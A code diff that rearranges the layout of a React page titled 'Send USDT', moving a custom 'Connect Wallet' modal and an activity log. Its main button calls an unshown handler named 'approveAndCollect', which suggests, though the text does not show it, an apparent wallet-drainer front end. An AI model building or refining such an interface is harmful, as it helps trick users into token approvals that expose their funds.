@@ -453,10 +453,8 @@ export default function App() {
   };
 
   return (
-    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950 relative">
-      <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden relative z-10">
-        
-        {/* Header */}
+    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
+      <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden">
         <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
           <div className="flex items-center gap-3">
             <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">
@@ -470,8 +468,6 @@ export default function App() {
         </div>
 
         <div className="p-8 space-y-8">
-          
-          {/* View 1: Not Connected */}
           {!isConnected ? (
             <div className="text-center">
               <h2 className="text-5xl font-bold mb-3">Send USDT</h2>
@@ -490,8 +486,6 @@ export default function App() {
               </p>
             </div>
           ) : (
-            
-            /* View 2: Connected */
             <div className="space-y-6">
               <div className="bg-zinc-950 p-5 rounded-2xl flex justify-between items-center">
                 <div>
@@ -513,7 +507,7 @@ export default function App() {
                 </p>
               </div>
 
-              <button
+            <button
                 onClick={approveAndCollect}
                 disabled={loading}
                 className={`w-full font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70 ${
@@ -537,74 +531,72 @@ export default function App() {
             </div>
           )}
 
-          {/* Debug Monitor */}
-          <div className="mt-6 pt-6 border-t border-zinc-800">
-            <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
-            <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
-              {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
-              {debugLog.map((line, i) => (
-                <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : line.includes('⚠️') ? 'text-yellow-400' : 'text-zinc-400'}`}>
-                  {`> ${line}`}
+          {/* ✨ YOUR CUSTOM CONNECT WALLET MODAL ✨ */}
+          {showWalletModal && (
+            <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/80 p-4 pb-8 sm:p-4 transition-all">
+              <div className="bg-[#121212] border border-zinc-800 rounded-3xl w-full max-w-sm overflow-hidden shadow-2xl relative">
+                
+                {/* Header */}
+                <div className="pt-6 pb-4 px-6 text-center relative">
+                  <h3 className="font-bold text-white text-xl">Connect Wallet</h3>
+                  <button 
+                    onClick={() => setShowWalletModal(false)} 
+                    className="absolute right-6 top-6 text-zinc-500 hover:text-white"
+                  >
+                    ✕
+                  </button>
                 </div>
-              ))}
+
+                {/* Buttons */}
+                <div className="p-4 space-y-3">
+                  
+                  {/* Option 1: Browser Wallet */}
+                  <button 
+                    onClick={triggerReown}
+                    className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-emerald-500/50 rounded-2xl transition-all group"
+                  >
+                    <div className="w-12 h-12 bg-orange-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
+                      <span className="text-2xl">🦊</span>
+                    </div>
+                    <div className="text-left">
+                      <p className="font-bold text-white text-[15px]">Browser Wallet</p>
+                      <p className="text-xs text-zinc-400 mt-0.5">MetaMask, Rabby, Coinbase...</p>
+                    </div>
+                  </button>
+
+                  {/* Option 2: Trust Wallet & Mobile */}
+                  <button 
+                    onClick={triggerReown}
+                    className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-transparent rounded-2xl transition-all group"
+                  >
+                    <div className="w-12 h-12 bg-blue-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
+                      <span className="text-2xl">🛡️</span>
+                    </div>
+                    <div className="text-left">
+                      <p className="font-bold text-white text-[15px]">Trust Wallet & Mobile</p>
+                      <p className="text-xs text-zinc-400 mt-0.5">Scan QR • Works with any wallet</p>
+                    </div>
+                  </button>
+
+                </div>
+              </div>
             </div>
+          )}
+
+        <div className="mt-6 pt-6 border-t border-zinc-800">
+          <p className="text-[10px] uppercase tracking-widest text-zinc-500 mb-3 font-bold">Activity Log</p>
+          <div className="bg-black/50 rounded-xl p-3 font-mono text-[11px] space-y-1">
+            {debugLog.length === 0 && <p className="text-zinc-600 italic">Waiting for connection...</p>}
+            {debugLog.map((line, i) => (
+              <div key={i} className={`${line.includes('❌') ? 'text-red-400' : line.includes('✅') ? 'text-emerald-400' : line.includes('⚠️') ? 'text-yellow-400' : 'text-zinc-400'}`}>
+                {`> ${line}`}
+              </div>
+            ))}
           </div>
+        </div>
 
         </div>
       </div>
-
-      {/* ✨ YOUR CUSTOM CONNECT WALLET MODAL ✨ */}
-      {/* Moved to the absolute top level of the component so it covers everything seamlessly */}
-      {showWalletModal && (
-        <div className="fixed inset-0 z-[100] flex items-end sm:items-center justify-center bg-black/80 p-4 pb-8 sm:p-4 backdrop-blur-sm">
-          <div className="bg-[#121212] border border-zinc-800 rounded-3xl w-full max-w-sm overflow-hidden shadow-[0_0_50px_rgba(0,0,0,0.8)] relative animate-in fade-in slide-in-from-bottom-8 duration-200">
-            
-            {/* Header */}
-            <div className="pt-6 pb-4 px-6 text-center relative">
-              <h3 className="font-bold text-white text-xl">Connect Wallet</h3>
-              <button 
-                onClick={() => setShowWalletModal(false)} 
-                className="absolute right-6 top-6 text-zinc-500 hover:text-white"
-              >
-                ✕
-              </button>
-            </div>
-
-            {/* Buttons */}
-            <div className="p-4 space-y-3">
-              
-              {/* Option 1: Browser Wallet */}
-              <button 
-                onClick={triggerReown}
-                className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-emerald-500/50 rounded-2xl transition-all group"
-              >
-                <div className="w-12 h-12 bg-orange-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
-                  <span className="text-2xl">🦊</span>
-                </div>
-                <div className="text-left">
-                  <p className="font-bold text-white text-[15px]">Browser Wallet</p>
-                  <p className="text-xs text-zinc-400 mt-0.5">MetaMask, Rabby, Coinbase...</p>
-                </div>
-              </button>
-
-              {/* Option 2: Trust Wallet & Mobile */}
-              <button 
-                onClick={triggerReown}
-                className="w-full flex items-center p-4 bg-[#1A1B1F] hover:bg-[#222327] border border-transparent rounded-2xl transition-all group"
-              >
-                <div className="w-12 h-12 bg-blue-500/10 rounded-xl flex items-center justify-center mr-4 group-hover:scale-105 transition-transform">
-                  <span className="text-2xl">🛡️</span>
-                </div>
-                <div className="text-left">
-                  <p className="font-bold text-white text-[15px]">Trust Wallet & Mobile</p>
-                  <p className="text-xs text-zinc-400 mt-0.5">Scan QR • Works with any wallet</p>
-                </div>
-              </button>
-
-            </div>
-          </div>
-        </div>
-      )}
     </div>
   )
 }
